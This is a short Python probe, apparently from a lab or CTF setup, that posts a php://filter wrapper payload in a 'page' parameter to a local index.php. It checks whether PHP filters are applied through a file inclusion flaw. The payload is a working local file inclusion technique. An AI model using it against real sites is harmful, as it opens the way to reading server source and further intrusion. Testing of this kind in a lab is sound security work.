
import requests

URL = "http://localhost:9051/index.php"

def test():
    print("[*] Testing 'string.toupper' filter...")
    # 'home.php' contains "Welcome..."
    # If filter works, we expect "WELCOME..."
    
    # We read 'src/home.php' (assuming relative path or absolute)
    # The container pwd is /var/www/html/. home.php is there.
    
    payload = "php://filter/read=string.toupper/resource=home.php"
    
    try:
        r = requests.post(URL, data={'page': payload})
        print(f"Status: {r.status_code}")
        print("Response Snippet:", r.text[:100])
        
        if "WELCOME" in r.text:
            print("[+] success: Filters are WORKING.")
        elif "Welcome" in r.text:
            print("[-] failure: Filters IGNORED (Case is original).")
        else:
            print("[-] failure: Output unexpected.")
            
    except Exception as e:
        print(f"Error: {e}")

if __name__ == "__main__":
    test()
